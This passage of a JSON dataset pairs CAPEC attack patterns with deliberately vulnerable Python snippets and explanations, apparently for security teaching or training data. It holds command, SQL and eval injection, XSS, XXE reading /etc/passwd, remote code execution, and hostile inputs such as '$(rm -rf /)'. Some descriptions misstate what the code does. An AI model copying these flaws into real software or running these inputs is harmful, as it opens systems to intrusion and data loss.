        "code_snippet": "import ctypes\n\n# Unsafe C code as a string\nc_code = \"\"\"\n#include <stdio.h>\nvoid unsafe_function() {\n    printf(\"Executing unsafe C code!\\n\");\n    // Potentially dangerous operation\n    *((unsigned int*)0) = 0;\n}\n\"\"\"\n\n# Write the C code to a temporary file\nwith open('unsafe_code.c', 'w') as f:\n    f.write(c_code)\n\n# Compile the C code into a shared library\nimport os\nos.system('gcc -shared -o unsafe_code.so -fPIC unsafe_code.c')\n\n# Load the shared library using ctypes\nunsafe_lib = ctypes.CDLL('./unsafe_code.so')\n\n# Call the unsafe function\nunsafe_lib.unsafe_function()",
        "description": "This Python code snippet demonstrates the concept of escaping a sandbox by calling code in another language, specifically C, which can perform unsafe operations. The Python script writes a C code snippet to a file, compiles it into a shared library, and then uses the `ctypes` library to load and execute the C code. The C code contains an unsafe operation that attempts to modify an arbitrary memory location, which is something that would not be allowed in a safe, sandboxed environment like Java. This example embodies the CAPEC idea of escaping a sandbox by leveraging the ability to call native code, thus bypassing the sandbox's restrictions. The related CWEs are represented by the use of unsafe JNI (CWE-111) and the potential for protection mechanism failure (CWE-693)."
    },
    {
        "capec_id": "238",
        "capec_name": "DEPRECATED: Using URL/codebase / G.A.C. (code source) to convince sandbox of privilege",
        "code_snippet": "import os\nfrom urllib.parse import urlparse\n\n# CWE-551: Incorrect Behavior Order: Authorization Before Parsing and Canonicalization\n# CWE-424: Improper Protection of Alternate Path\n\ndef is_authorized(user, url):\n    # Simulate authorization check\n    return user == 'admin'\n\ndef access_resource(user, url):\n    # Authorization check before URL parsing\n    if not is_authorized(user, url):\n        return 'Access Denied'\n\n    # Parse the URL after authorization check\n    parsed_url = urlparse(url)\n    resource_path = os.path.normpath(parsed_url.path)\n\n    # Simulate resource access\n    if os.path.exists(resource_path):\n        return f'Accessing {resource_path}'\n    else:\n        return 'Resource Not Found'\n\n# Example usage\nuser = 'guest'\nurl = 'http://example.com/../admin/resource'\nprint(access_resource(user, url))",
        "description": "This Python code snippet demonstrates a vulnerability where authorization is checked before URL parsing and canonicalization (CWE-551). The `is_authorized` function simulates an authorization check based on the user, and the `access_resource` function attempts to access a resource based on the provided URL. The authorization check is performed before the URL is parsed and normalized, which can lead to improper protection of alternate paths (CWE-424). An attacker could exploit this by crafting a URL that bypasses authorization checks, potentially accessing restricted resources."
    },
    {
        "capec_id": "239",
        "capec_name": "DEPRECATED: Subversion of Authorization Checks: Cache Filtering, Programmatic Security, etc.",
        "code_snippet": "import hashlib\n\n# Simulated client-side authentication\nclass Client:\n    def __init__(self, username, password):\n        self.username = username\n        self.password = hashlib.sha256(password.encode()).hexdigest()\n\n    def authenticate(self):\n        # Client-side authentication logic\n        if self.username == 'admin' and self.password == hashlib.sha256('password123'.encode()).hexdigest():\n            return True\n        return False\n\n# Simulated server-side functionality\nclass Server:\n    def __init__(self):\n        self.data = 'Sensitive Data'\n\n    def get_data(self, client):\n        # Server relies on client-side authentication\n        if client.authenticate():\n            return self.data\n        else:\n            return 'Access Denied'\n\n# Example usage\nclient = Client('admin', 'password123')\nserver = Server()\nprint(server.get_data(client))  # Outputs: Sensitive Data\n\n# Malicious client bypassing authentication\nclass MaliciousClient:\n    def authenticate(self):\n        return True\n\nmalicious_client = MaliciousClient()\nprint(server.get_data(malicious_client))  # Outputs: Sensitive Data",
        "description": "This Python code snippet demonstrates a vulnerable implementation where the server relies on client-side authentication. The `Client` class performs authentication checks, but these checks are not enforced on the server side. The `Server` class trusts the client's authentication result to grant access to sensitive data. A `MaliciousClient` class can easily bypass the authentication by always returning `True` in its `authenticate` method, thus gaining unauthorized access to the server's sensitive data. This example embodies the main idea of CAPEC-207 and related CWEs, particularly CWE-602 (Client-Side Enforcement of Server-Side Security) and CWE-603 (Use of Client-Side Authentication)."
    },
    {
        "capec_id": "240",
        "capec_name": "Resource Injection",
        "code_snippet": "import os\n\ndef read_file(file_path):\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return 'File not found.'\n\ndef main():\n    user_input = input('Enter the file name to read: ')\n    # Vulnerable to Resource Injection\n    file_content = read_file(user_input)\n    print(file_content)\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a vulnerability to Resource Injection (CAPEC-99) by improperly handling user input for a file path. The `read_file` function attempts to read a file based on the user-provided file path without validating or sanitizing the input. This can lead to unintended access to sensitive files or directories. The code does not restrict the input, allowing an attacker to specify arbitrary file paths, potentially leading to security breaches. This example also touches on CWE-20 (Improper Input Validation) and CWE-99 (Improper Control of Resource Identifiers) by not validating the user input before using it as a resource identifier."
    },
    {
        "capec_id": "241",
        "capec_name": "DEPRECATED: Code Injection",
        "code_snippet": "import os\n\n# Vulnerable function that executes user input as code\n# CWE-242: Code Injection\n# CWE-477: Use of Obsolete Function\n# CWE-287: Authentication Bypass Issues\n\ndef execute_user_code(user_input):\n    # CWE-477: Using obsolete 'exec' function\n    exec(user_input)\n\n# Simulating an authentication bypass (CWE-287)\ndef authenticate(user):\n    if user == 'admin':\n        return True\n    return False\n\n# Main function\ndef main():\n    user = input('Enter username: ')\n    if authenticate(user):\n        # CWE-242: Code Injection vulnerability\n        user_code = input('Enter code to execute: ')\n        execute_user_code(user_code)\n    else:\n        print('Authentication failed')\n\nif __name__ == '__main__':\n    main()",
        "description": "This Python code snippet demonstrates a code injection vulnerability (CAPEC-242) by using the 'exec' function to execute user-provided input. The 'exec' function is considered obsolete and dangerous (CWE-477) because it can execute arbitrary code, leading to potential security risks. Additionally, the code simulates an authentication bypass issue (CWE-287) by allowing any user who inputs 'admin' as the username to execute arbitrary code. This combination of vulnerabilities highlights the risks associated with improper input handling and the use of deprecated functions."
    },
    {
        "capec_id": "242",
        "capec_name": "Code Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # CWE-77: Improper Neutralization of Special Elements used in a Command ('Command Injection')\n    command = f'echo {user_input}'\n    os.system(command)\n\n# Example of vulnerable input\nuser_input = '$(rm -rf /)'  # CWE-94: Improper Control of Generation of Code ('Code Injection')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a code injection vulnerability. The function `execute_command` takes user input and constructs a shell command using that input. The command is then executed using `os.system`. The user input is not properly sanitized, allowing an attacker to inject malicious code. In this example, the input '$(rm -rf /)' could lead to a destructive command being executed, showcasing CWE-94 and CWE-77 vulnerabilities. The code highlights the importance of proper input validation and neutralization to prevent code injection attacks."
    },
    {
        "capec_id": "243",
        "capec_name": "XSS Targeting HTML Attributes",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('query', '')\n    # Vulnerable to XSS in HTML attributes\n    html_content = f'<a href=\"#\" style=\"color:red\" onmouseover=\"alert(\\'{query}\\')\">Hover over me</a>'\n    return render_template_string(html_content)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) targeting HTML attributes. The application has a single route '/search' that takes a 'query' parameter from the URL. The 'query' parameter is directly inserted into an HTML attribute (onmouseover) without proper sanitization. This allows an attacker to inject malicious JavaScript code, which will be executed when a user hovers over the link. This example embodies the main idea of the CAPEC by showing how improper neutralization of script in HTML attributes can lead to XSS vulnerabilities. The related CWEs provide additional context on the types of improper neutralizations that can occur, such as in IMG tags or basic XSS scenarios."
    },
    {
        "capec_id": "244",
        "capec_name": "XSS Targeting URI Placeholders",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search')\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable to XSS via URI placeholders\n    return render_template_string('<a href=\"javascript:alert({{ query }})\">Click me</a>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to Cross-Site Scripting (XSS) attacks via URI placeholders. The application has a single route '/search' that takes a query parameter 'q' from the URL. The query parameter is then directly embedded into an anchor tag's href attribute without proper neutralization. This allows an attacker to inject malicious JavaScript code through the 'q' parameter, which will be executed when the user clicks on the link. This example embodies the main idea of the CAPEC by showing how improper neutralization of user input in URI placeholders can lead to XSS vulnerabilities. The related CWEs provide additional context on the types of improper neutralizations that can occur, such as in script attributes, IMG tags, and encoded URI schemes."
    },
    {
        "capec_id": "245",
        "capec_name": "XSS Using Doubled Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('q', '')\n    # Vulnerable to doubled character XSS attack\n    if '<<script>' in query:\n        return 'Potential XSS detected!'\n    return render_template_string('<h1>Search Results for: {}</h1>'.format(query))\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to a doubled character XSS attack. The application has a search endpoint that takes a query parameter from the user. The code attempts to filter out XSS attacks by checking for the presence of the string '<<script>', but this check is insufficient. An attacker can bypass this filter by using doubled characters in a different way, such as '<<script>' or '%3C%3Cscript'. The query is then directly rendered into the HTML without proper sanitization, leading to a potential XSS vulnerability. This example highlights the importance of proper input validation and neutralization to prevent XSS attacks."
    },
    {
        "capec_id": "246",
        "capec_name": "DEPRECATED: XSS Using Flash",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/submit', methods=['POST'])\ndef submit():\n    user_input = request.form['user_input']\n    # Incomplete denylist for XSS protection\n    denylist = ['<script>', '</script>', 'javascript:']\n    for item in denylist:\n        user_input = user_input.replace(item, '')\n    # Vulnerable to XSS in IMG tag attributes\n    response = f'<img src=\"{user_input}\" />'\n    return render_template_string(response)\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a vulnerable web application using Flask. The application accepts user input via a POST request and attempts to sanitize it using an incomplete denylist, which is a common weakness (CWE-692). The denylist approach fails to cover all possible XSS vectors, leaving the application susceptible to attacks. Additionally, the user input is directly inserted into the 'src' attribute of an IMG tag without proper neutralization, making it vulnerable to XSS (CWE-82). This code embodies the deprecated CAPEC pattern of XSS using Flash by illustrating how improper input handling and neutralization can lead to security vulnerabilities."
    },
    {
        "capec_id": "247",
        "capec_name": "XSS Using Invalid Characters",
        "code_snippet": "from flask import Flask, request, render_template_string\n\napp = Flask(__name__)\n\n@app.route('/search', methods=['GET'])\ndef search():\n    query = request.args.get('query', '')\n    # Improper neutralization of invalid characters\n    if '\\x00' in query or '\\r' in query or '\\n' in query or '\\t' in query:\n        return 'Invalid input detected', 400\n    # Vulnerable to XSS due to improper neutralization of script-related HTML tags\n    return render_template_string('<h1>Search Results for: {{ query }}</h1>')\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet demonstrates a Flask web application that is vulnerable to XSS attacks due to improper neutralization of invalid characters and script-related HTML tags. The '/search' endpoint takes a 'query' parameter from the URL. The code attempts to filter out invalid characters like null, carriage return, line feed, and tab, but it does not properly neutralize script-related HTML tags. This allows an attacker to inject malicious scripts into the 'query' parameter, leading to a potential XSS attack. The code highlights the main idea of CAPEC-86 and related CWEs by showing how improper input filtering can lead to security vulnerabilities."
    },
    {
        "capec_id": "248",
        "capec_name": "Command Injection",
        "code_snippet": "import os\n\ndef execute_command(user_input):\n    # Vulnerable to command injection\n    command = f'ls {user_input}'\n    os.system(command)\n\nuser_input = input('Enter directory name: ')\nexecute_command(user_input)",
        "description": "This Python code snippet demonstrates a command injection vulnerability. The function `execute_command` takes user input and constructs an OS command string using that input. The command is then executed using `os.system()`. Since the user input is directly included in the command string without proper validation or neutralization, an attacker can inject malicious commands. For example, if the user inputs `; rm -rf /`, it would execute the `ls` command followed by the `rm -rf /` command, potentially causing significant damage. This snippet embodies the main idea of CAPEC-88 and related CWEs, highlighting the risks of improper neutralization of special elements in command construction."
    },
    {
        "capec_id": "249",
        "capec_name": "DEPRECATED: Linux Terminal Injection",
        "code_snippet": "import os\n\n# Vulnerable function that takes user input and executes a command\n\ndef execute_command(user_input):\n    # CWE-77: Command Injection vulnerability\n    command = f'echo {user_input}'\n    os.system(command)\n\n# Example usage\nuser_input = input('Enter a string: ')\nexecute_command(user_input)\n",
        "description": "This Python code snippet demonstrates a command injection vulnerability (CWE-77) by taking user input and directly incorporating it into an OS command without proper sanitization. The `execute_command` function constructs a command using the user-provided input and executes it using `os.system()`. This can be exploited if the user input contains special characters or commands, leading to unintended command execution. The code embodies the main idea of the deprecated CAPEC 'Linux Terminal Injection' by showing how improper neutralization of special elements in user input can lead to security vulnerabilities."
    },
    {
        "capec_id": "250",
        "capec_name": "XML Injection",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Simulated user input\nuser_input = \"<user><name>admin</name><password>' or '1'='1</password></user>\"\n\n# Vulnerable XML parsing\ntry:\n    root = ET.fromstring(user_input)\n    username = root.find('name').text\n    password = root.find('password').text\n    print(f'Username: {username}, Password: {password}')\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a basic example of XML Injection vulnerability. The code takes a simulated user input in the form of an XML string and parses it using the xml.etree.ElementTree module. The user input contains an XML structure with a potential injection payload in the password field. The code does not perform any input validation or neutralization, allowing an attacker to inject malicious content. This can lead to unauthorized access or manipulation of the XML data, embodying the main idea of CAPEC-91 and related CWEs such as CWE-20 (Improper Input Validation) and CWE-643 (XPath Injection)."
    },
    {
        "capec_id": "251",
        "capec_name": "Local Code Inclusion",
        "code_snippet": "import os\n\ndef load_local_code(file_path):\n    if not os.path.isabs(file_path):\n        file_path = os.path.abspath(file_path)\n    with open(file_path, 'r') as file:\n        code = file.read()\n    exec(code)\n\n# Example usage\nload_local_code('user_supplied_code.py')",
        "description": "This Python code snippet demonstrates a Local Code Inclusion vulnerability. The function `load_local_code` takes a file path as input, converts it to an absolute path if it is not already, reads the content of the file, and executes it using the `exec` function. This embodies the main idea of CAPEC-829, where an attacker can force the application to load and execute arbitrary code files from the local machine. The code also touches on CWE-829 (Inclusion of Functionality from Untrusted Control Sphere) by allowing the inclusion of potentially malicious code from an untrusted source. Additionally, it indirectly relates to CWE-913 (Improper Control of Dynamically-Managed Code Resources) by not properly restricting the execution of dynamically loaded code."
    },
    {
        "capec_id": "252",
        "capec_name": "PHP Local File Inclusion",
        "code_snippet": "import os\nfrom flask import Flask, request\n\napp = Flask(__name__)\n\n@app.route('/load_file', methods=['GET'])\ndef load_file():\n    filename = request.args.get('filename')\n    if not filename:\n        return 'Filename not provided', 400\n    try:\n        with open(os.path.join('/var/www/html', filename), 'r') as file:\n            return file.read()\n    except Exception as e:\n        return str(e), 500\n\nif __name__ == '__main__':\n    app.run(debug=True)",
        "description": "This Python code snippet represents a vulnerable web application using Flask. The application has an endpoint '/load_file' that takes a 'filename' parameter from the query string and attempts to read and return the contents of the specified file from the '/var/www/html' directory. This code is vulnerable to Local File Inclusion (LFI) attacks, as it does not properly validate or sanitize the 'filename' parameter. An attacker could exploit this by providing a path to a sensitive file on the server, such as '/etc/passwd', or by using directory traversal techniques to access files outside the intended directory. This example embodies the main idea of the CAPEC by demonstrating how an attacker can load and execute arbitrary local files, potentially leading to further exploitation."
    },
    {
        "capec_id": "253",
        "capec_name": "Remote Code Inclusion",
        "code_snippet": "import requests\n\n# CWE-494: Download of Code Without Integrity Check\nurl = 'http://example.com/malicious_code.py'\nresponse = requests.get(url)\n\n# CWE-829: Inclusion of Functionality from Untrusted Control Sphere\nexec(response.text)\n",
        "description": "This Python code snippet demonstrates a Remote Code Inclusion vulnerability. The code downloads a Python script from a remote URL without performing any integrity checks (CWE-494). It then executes the downloaded code using the 'exec' function, which includes functionality from an untrusted control sphere (CWE-829). This can lead to the execution of malicious code, compromising the security of the application."
    },
    {
        "capec_id": "254",
        "capec_name": "DEPRECATED: DTD Injection in a SOAP Message",
        "code_snippet": "import xml.etree.ElementTree as ET\n\n# Vulnerable XML data with DTD\nxml_data = '''<?xml version=\"1.0\"?>\n<!DOCTYPE root [\n<!ENTITY xxe SYSTEM \"file:///etc/passwd\">\n]>\n<root>&xxe;</root>'''\n\ntry:\n    # Parse the XML data\n    tree = ET.ElementTree(ET.fromstring(xml_data))\n    root = tree.getroot()\n    print(ET.tostring(root, encoding='unicode'))\nexcept ET.ParseError as e:\n    print(f'Error parsing XML: {e}')",
        "description": "This Python code snippet demonstrates a vulnerability related to DTD Injection (CAPEC-228) and improper control of DTDs (CWE-827). The XML data includes a Document Type Definition (DTD) that defines an external entity 'xxe' which references the system file '/etc/passwd'. When the XML is parsed, the external entity is expanded, potentially exposing sensitive information. This example highlights the risk of allowing arbitrary DTDs in XML parsing, which can lead to information exposure and other security issues."
    },
    {
        "capec_id": "256",
        "capec_name": "SOAP Array Overflow",
        "code_snippet": "import struct\n\ndef process_soap_request(data):\n    # Extract the length of the array from the SOAP request\n    array_length = struct.unpack('I', data[:4])[0]\n    \n    # Allocate buffer based on the specified length\n    buffer = [0] * array_length\n    \n    # Read the actual data into the buffer\n    for i in range(array_length):\n        buffer[i] = struct.unpack('I', data[4 + i*4:8 + i*4])[0]\n    \n    return buffer\n\n# Example SOAP request with understated length\n# Actual length is 5, but specified length is 3\nsoap_request = struct.pack('I', 3) + struct.pack('5I', 1, 2, 3, 4, 5)\n\n# Process the SOAP request\nresult = process_soap_request(soap_request)\nprint(result)",
        "description": "This Python code snippet demonstrates a vulnerability where a SOAP request specifies an array length that is smaller than the actual data length. The `process_soap_request` function extracts the length of the array from the first 4 bytes of the request and allocates a buffer based on this length. It then reads the actual data into the buffer. If the actual data length exceeds the specified length, this can lead to a buffer overflow, as the function naively trusts the specified length. This embodies the main idea of the CAPEC 'SOAP Array Overflow' and is related to CWEs such as 'Buffer Access with Incorrect Length Value' and 'Improper Handling of Length Parameter Inconsistency'."
    },
    {
        "capec_id": "257",
        "capec_name": "DEPRECATED: Abuse of Transaction Data Structure",
        "code_snippet": "import logging\n\n# CWE-532: Information Exposure Through Log Files\nlogging.basicConfig(filename='server.log', level=logging.DEBUG)\n\n# Simulated transaction data\ntransaction_data = {\n    'user_id': '12345',\n    'amount': 100.0,\n    'currency': 'USD',\n    'status': 'pending'\n}\n\n# CWE-287: Authentication Bypass Issues\n# Simulating an authentication bypass\nuser_authenticated = False\nif not user_authenticated:\n    logging.debug(f\"Unauthorized access attempt: {transaction_data}\")\n    print(\"Access Denied\")\nelse:\n    # CWE-493: Failure to provide confidentiality for stored data\n    logging.debug(f\"Transaction data: {transaction_data}\")\n    print(\"Transaction processed\")",
        "description": "This Python code snippet demonstrates several deprecated CWE weaknesses in the context of a deprecated CAPEC attack pattern. The code simulates a transaction data structure and logs sensitive information to a server log file (CWE-532). It also includes a simulated authentication bypass (CWE-287), where unauthorized access attempts are logged. Additionally, the code fails to provide confidentiality for stored transaction data (CWE-493) by logging it in plaintext. The main idea is to show how improper handling of transaction data and logging can lead to security vulnerabilities."
    },
    {
        "capec_id": "258",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Dynamic Update",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n        self.sock.connect((self.server_ip, self.server_port))\n\n    def authenticate(self, username, password):\n        # Authentication is done on the client side\n        if username == 'admin' and password == 'password':\n            self.sock.send(b'AUTH_SUCCESS')\n        else:\n            self.sock.send(b'AUTH_FAIL')\n\n    def send_data(self, data):\n        self.sock.send(data.encode())\n\n# Example usage\nclient = Client('127.0.0.1', 8080)\nclient.authenticate('admin', 'password')\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class connects to a server and performs authentication by checking the username and password on the client side. If the credentials match, it sends an 'AUTH_SUCCESS' message to the server. This approach is flawed because the authentication logic is implemented on the client side, making it easy for an attacker to bypass it by modifying the client code. Additionally, the code does not protect the data being sent, making it susceptible to sniffing and capture-replay attacks. This example embodies the main idea of the deprecated CAPEC and related CWEs, highlighting the risks of client-side authentication and the potential for capture-replay attacks."
    },
    {
        "capec_id": "259",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Patching",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n\n    def authenticate(self, username, password):\n        # Authentication is done on the client side (vulnerable)\n        if username == 'admin' and password == 'password':\n            return True\n        return False\n\n    def send_data(self, data):\n        if self.authenticate('admin', 'password'):\n            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n                s.connect((self.server_ip, self.server_port))\n                s.sendall(data.encode())\n                response = s.recv(1024)\n                print('Received', repr(response))\n\n# Example usage\nclient = Client('127.0.0.1', 65432)\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class performs authentication within the client code, which can be easily bypassed by modifying the client. This is related to CWE-603 (Use of Client-Side Authentication). The code also sends data over a network connection, which could be sniffed and captured by an attacker, aligning with the deprecated CAPEC pattern of sniffing application code during patching. The authentication check is weak and can be bypassed, leading to potential security risks such as capture-replay attacks (CWE-294)."
    },
    {
        "capec_id": "260",
        "capec_name": "DEPRECATED: Passively Sniffing and Capturing Application Code Bound for an Authorized Client During Initial Distribution",
        "code_snippet": "import socket\n\n# Vulnerable client-side authentication\nclass Client:\n    def __init__(self, server_ip, server_port):\n        self.server_ip = server_ip\n        self.server_port = server_port\n        self.authenticated = False\n\n    def authenticate(self, username, password):\n        # Sending credentials over the network (potentially sniffable)\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(f'{username}:{password}'.encode())\n            response = s.recv(1024).decode()\n            if response == 'OK':\n                self.authenticated = True\n            else:\n                self.authenticated = False\n\n    def send_data(self, data):\n        if not self.authenticated:\n            raise Exception('Client not authenticated')\n        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:\n            s.connect((self.server_ip, self.server_port))\n            s.sendall(data.encode())\n            print('Data sent')\n\n# Example usage\nclient = Client('127.0.0.1', 65432)\nclient.authenticate('user', 'pass')\nclient.send_data('Sensitive data')",
        "description": "This Python code snippet demonstrates a vulnerable client-side authentication mechanism. The `Client` class attempts to authenticate by sending credentials (username and password) over the network to a server. This process is vulnerable to sniffing attacks, where an attacker can capture the credentials during transmission. Additionally, the authentication is performed on the client side, which can be bypassed if the client code is modified. This example embodies the main idea of the CAPEC, highlighting the risks of sniffing application code and related CWE issues such as authentication bypass by capture-replay (CWE-294) and use of client-side authentication (CWE-603)."
    },
    {
        "capec_id": "261",
        "capec_name": "Fuzzing for garnering other adjacent user/sensitive data",
        "code_snippet": "import sqlite3\n\n# Connect to the database\nconn = sqlite3.connect('example.db')\ncursor = conn.cursor()\n\n# Create a table\ncursor.execute('''CREATE TABLE IF NOT EXISTS users (id INTEGER PRIMARY KEY, username TEXT, password TEXT)''')\nconn.commit()\n\n# Function to fetch user data based on username\n# This function is vulnerable to SQL Injection\n# CWE-89: Improper Neutralization of Special Elements used in an SQL Command ('SQL Injection')\ndef get_user_data(username):\n    query = f\"SELECT * FROM users WHERE username = '{username}'\"\n    cursor.execute(query)\n    return cursor.fetchall()\n\n# Example usage\ntry:\n    # CWE-20: Improper Input Validation\n    # CWE-943: Improper Neutralization of Special Elements in Data Query Logic\n    user_data = get_user_data(\"admin' OR '1'='1\")\n    print(user_data)\nexcept sqlite3.Error as e:\n    # CWE-209: Generation of Error Message Containing Sensitive Information\n    print(f\"An error occurred: {e}\")\n\n# Close the connection\nconn.close()",
        "description": "This Python code snippet demonstrates a vulnerable implementation of a function that fetches user data from a SQLite database based on a username. The function `get_user_data` constructs an SQL query using string interpolation, making it susceptible to SQL Injection (CWE-89). An attacker can exploit this by providing a specially crafted username, such as \"admin' OR '1'='1\", to retrieve all user data. The code also lacks proper input validation (CWE-20) and does not neutralize special elements in the data query logic (CWE-943). Additionally, if an error occurs, the error message may expose sensitive information (CWE-209). This snippet embodies the main idea of the CAPEC by showing how an adversary can send modified queries to extract sensitive information beyond what is intended."
    },
    {
        "capec_id": "263",
        "capec_name": "Force Use of Corrupted Files",
        "code_snippet": "import os\nimport tempfile\n\n# CWE-377: Insecure Temporary File\n# CWE-434: Unrestricted Upload of File with Dangerous Type\n# CWE-646: Reliance on File Name or Extension of Externally-Supplied File\n\ndef process_file(file_path):\n    if not os.path.exists(file_path):\n        raise FileNotFoundError('File does not exist')\n\n    # CWE-829: Inclusion of Functionality from Untrusted Control Sphere\n    with open(file_path, 'r') as file:\n        data = file.read()\n        # Simulate processing the file\n        print('Processing file...')\n\n    # CWE-69: Improper Handling of Windows ::DATA Alternate Data Stream\n    if '::$DATA' in file_path:\n        raise ValueError('Invalid file path with ADS')\n\n# Simulate an attacker uploading a corrupted file\ncorrupted_file_path = tempfile.mktemp(suffix='.txt')\nwith open(corrupted_file_path, 'w') as f:\n    f.write('corrupted content')\n\ntry:\n    process_file(corrupted_file_path)\nexcept Exception as e:\n    print(f'Error: {e}')",
        "description": "This Python code snippet demonstrates a scenario where an application processes a file that could be corrupted by an attacker. The `process_file` function checks if the file exists and reads its content. It also includes a check for Windows Alternate Data Streams (ADS) to prevent improper handling (CWE-69). The code simulates an attacker uploading a corrupted file by creating a temporary file with potentially dangerous content (CWE-377, CWE-434). The function relies on the file extension to determine processing behavior (CWE-646), and it includes functionality from an untrusted control sphere by reading the file content (CWE-829). This snippet embodies the main idea of the CAPEC by showing how an application can be forced to use a corrupted file, potentially leading to denial of service or other vulnerabilities."
    },
    {
        "capec_id": "264",
        "capec_name": "DEPRECATED: Environment Variable Manipulation",
        "code_snippet": "import os\n\ndef execute_command():\n    # CWE-1108: Excessive Reliance on Global Variables\n    global command\n    command = os.getenv('USER_COMMAND')\n    if command:\n        # CWE-95: Improper Neutralization of Directives in Dynamically Evaluated Code ('Eval Injection')\n        eval(command)\n\n# CWE-1126: Declaration of Variable with Unnecessarily Wide Scope\ncommand = ''\nexecute_command()",
        "description": "This Python code snippet demonstrates a vulnerable pattern related to environment variable manipulation and several related CWEs. The function `execute_command` retrieves a command from an environment variable `USER_COMMAND` and executes it using `eval()`. This is dangerous because it allows for arbitrary code execution if the environment variable is controlled by an attacker (CWE-95). The use of a global variable `command` (CWE-1108) and its declaration outside the function (CWE-1126) further exacerbate the issue by making the code harder to manage and more prone to unintended side effects. The code snippet embodies the main idea of CAPEC-13 by showing how environment variables can be subverted to execute malicious code."
    },
    {
        "capec_id": "265",
        "capec_name": "DEPRECATED: Global variable manipulation",
        "code_snippet": "import os\n\n# Global variable\nuser_input = ''\n\n# Function to set global variable\ndef set_user_input():\n    global user_input\n    user_input = input('Enter a filename: ')\n\n# Function to read file content based on global variable\ndef read_file():\n    global user_input\n    try:\n        with open(user_input, 'r') as file:\n            print(file.read())\n    except FileNotFoundError:\n        print('File not found.')\n\n# Main function\nif __name__ == '__main__':\n    set_user_input()\n    read_file()",
        "description": "This Python code snippet demonstrates the vulnerability associated with excessive reliance on global variables and improper control of dynamically-identified variables. The global variable 'user_input' is set based on user input and then used to read a file. This approach is risky because it allows user input to directly influence the file being accessed, potentially leading to security issues such as arbitrary file access. The code also exemplifies the declaration of a variable with unnecessarily wide scope, as 'user_input' is used globally instead of being passed as a parameter to the functions that need it."
    },
    {
        "capec_id": "266",
        "capec_name": "DEPRECATED: Manipulate Canonicalization",
        "code_snippet": "import os\n\n# CWE-180: Validate Before Canonicalize\nuser_input = input('Enter a file path: ')\nif '..' in user_input or user_input.startswith('/'):\n    print('Invalid file path!')\nelse:\n    # Canonicalization step after validation\n    canonical_path = os.path.realpath(user_input)\n    try:\n        with open(canonical_path, 'r') as file:\n            print(file.read())\n    except FileNotFoundError:\n        print('File not found!')\n\n# CWE-95: Eval Injection\nuser_code = input('Enter code to execute: ')\neval(user_code)\n\n# CWE-915: Improperly Controlled Modification of Dynamically-Determined Object Attributes\nclass User:\n    def __init__(self, name, role):\n        self.name = name\n        self.role = role\n\nuser = User('Alice', 'user')\nuser_input = input('Enter attribute to modify (name/role): ')\nnew_value = input('Enter new value: ')\nsetattr(user, user_input, new_value)\nprint(f'User {user.name} now has role {user.role}')",
        "description": "This Python code snippet demonstrates several vulnerabilities related to the deprecated CAPEC 'Manipulate Canonicalization' and associated CWEs. The first part of the code (CWE-180) validates user input for a file path before canonicalizing it, which can lead to incorrect behavior if the input is manipulated. The second part (CWE-95) directly evaluates user input using 'eval', which can lead to code injection. The third part (CWE-915) allows dynamic modification of object attributes based on user input without proper control, potentially leading to unauthorized changes."
    },
    {
        "capec_id": "267",
        "capec_name": "Leverage Alternate Encoding",
        "code_snippet": "import os\n\n# Vulnerable function that does not properly handle alternate encoding\n# and allows external control of file name or path\n\ndef read_file(user_input):\n    # CWE-20: Improper Input Validation\n    if not isinstance(user_input, str):\n        raise ValueError(\"Invalid input\")\n\n    # CWE-180: Validate Before Canonicalize\n    if \"..\" in user_input or \"%2e%2e\" in user_input:  # Attempt to validate before canonicalization\n        raise ValueError(\"Invalid path\")\n\n    # CWE-73: External Control of File Name or Path\n    file_path = os.path.join(\"/safe/directory\", user_input)\n\n    try:\n        with open(file_path, 'r') as file:\n            return file.read()\n    except FileNotFoundError:\n        return \"File not found\"\n\n# Example usage\nuser_input = \"..%2f..%2fetc%2fpasswd\"  # Encoded path traversal attempt\nprint(read_file(user_input))",
